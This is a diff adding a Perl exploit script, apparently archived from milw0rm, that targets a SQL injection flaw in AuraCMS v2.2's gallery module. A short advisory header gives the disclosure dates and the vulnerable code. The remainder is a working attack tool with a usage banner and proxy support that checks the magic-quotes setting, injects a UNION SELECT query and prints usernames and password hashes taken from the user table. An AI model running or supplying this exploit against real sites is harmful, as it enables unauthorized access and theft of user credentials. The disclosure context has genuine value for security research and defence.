@@ -1,0 +1,116 @@
+#!/usr/bin/perl
+use LWP::UserAgent;
+use HTTP::Cookies;
+use Getopt::Long;
+
+#
+# [!] Discovered.: DNX
+# [!] Vendor.....: http://www.auracms.org
+# [!] Detected...: 19.01.2008
+# [!] Reported...: 25.01.2008
+# [!] Response...: 30.01.2008
+#
+# [!] Background.: AuraCMS is a CMS based on PHP and SQL
+#
+# [!] Bug........: $_GET['albums'] in mod/gallery/ajax/gallery_data.php near line 173
+#
+#                  173:  case 'detail':
+#                  174:    if (isset($_GET['id'])){
+#                  175:      $id = $_GET['id'];
+#                  176:      $albums = $_GET['albums'];
+#
+#                  200:      $query = mysql_query ("SELECT * FROM `mod_gallery`  WHERE `kid` = '$albums' $SQL_SORT LIMIT $image,$limitimage");
+#
+# [!] Solution...: Install gallery update!
+#
+
+if(!$ARGV[1])
+{
+  print "\n                             \\#'#/                        ";
+  print "\n                             (-.-)                         ";
+  print "\n   ---------------------oOO---(_)---OOo--------------------";
+  print "\n   | AuraCMS v2.2 (gallery_data.php) Remote SQL Injection |";
+  print "\n   |         (works only with magic quotes = off)         |";
+  print "\n   |                     coded by DNX                     |";
+  print "\n   --------------------------------------------------------";
+  print "\n[!] Usage......: perl aura.pl [Host] [Path] <Options>";
+  print "\n[!] Example....: perl aura.pl 127.0.0.1 /auracms/";
+  print "\n[!] Options....:";
+  print "\n       -p [ip:port]  Proxy support";
+  print "\n";
+  exit;
+}
+
+my $host    = $ARGV[0];
+my $path    = $ARGV[1];
+my %options = ();
+GetOptions(\%options, "p=s");
+
+print "[!] Exploiting...\n";
+
+exploit();
+
+print "\n[!] Exploit done\n";
+
+sub exploit
+{
+  my $url1 = "http://".$host.$path."index.php?pilih=gallery&mod=yes";
+  my $url2 = "http://".$host.$path."mod/gallery/ajax/gallery_data.php";
+  my $ua = LWP::UserAgent->new;
+  my $cookie = HTTP::Cookies->new();
+  my $regexp = ":\"(.*?)\",\"name\"(.*)([a-fA-F0-9]{32})";
+  my $res = "";
+  
+  if($options{"p"})
+  {
+    $ua->proxy('http', "http://".$options{"p"});
+  }
+  
+  ###############
+  # exist file? #
+  ###############
+  $res = $ua->get($url2);
+  if(!$res->is_success)
+  {
+    die("[!] Failed, file not found\n");
+  }
+  
+  ##########################
+  # get cookie from server #
+  ##########################
+  $res = $ua->get($url1);
+  $cookie->extract_cookies($res);
+  $ua->cookie_jar($cookie);
+  $ua->get($url2);
+  $res = $ua->get($url2);
+  
+  ######################
+  # check magic quotes #
+  ######################
+  $url2 .= "?action=detail&id=&image=&albums='";
+  $res = $ua->get($url2);
+  $content = $res->content;
+  
+  if($content =~ /,\"albums\":\[\"\\\\'\"],/)
+  {
+    die("[!] Failed, magic quotes on\n")
+  }
+  
+  ##############
+  # get hashes #
+  ##############
+  $url2 .= "%20union%20select%20user,2,3,4,5,6,7,password,9,10%20from%20useraura/*";
+  $res = $ua->get($url2);
+  $content = $res->content;
+  
+  my @cont = split(/{\"files\"/, $content);
+  foreach (@cont)
+  {
+    if($_ =~ /$regexp/)
+    {
+      print "$1 $3\n";
+    }
+  }
+}
+
+# milw0rm.com [2008-02-12]
